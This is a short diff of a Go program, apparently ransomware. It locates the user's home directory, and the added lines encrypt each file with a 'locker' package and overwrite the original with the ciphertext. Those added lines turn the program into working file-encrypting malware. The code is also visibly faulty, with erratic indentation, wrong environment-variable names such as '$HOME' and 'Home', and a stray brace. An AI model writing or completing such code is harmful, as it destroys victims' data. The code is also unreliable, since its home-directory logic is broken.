@@ -21,8 +21,8 @@ func main() {
 		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
 		if home == "" {
 			home = os.Getenv("USERPROFILE")
-		}
-	        if runtime.GOOS == "linux" {
+		  }
+	          if runtime.GOOS == "linux" {
 		           home = os.Getenv("$HOME")
                      } else {
 		                   home = os.Getenv("Home")
@@ -39,7 +39,16 @@ func main() {
 		if err != nil {
 			continue
 		}
-		locked, err := locker.Encrypt(clearText, locker.KeyGen())
+		locked, err := locker.Encrypt(clearText, newkey)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		err = ioutil.WriteFile(file, *locked, 0644)
+		if err != nil {
+			continue
+		}
+
 	}
 }
 }
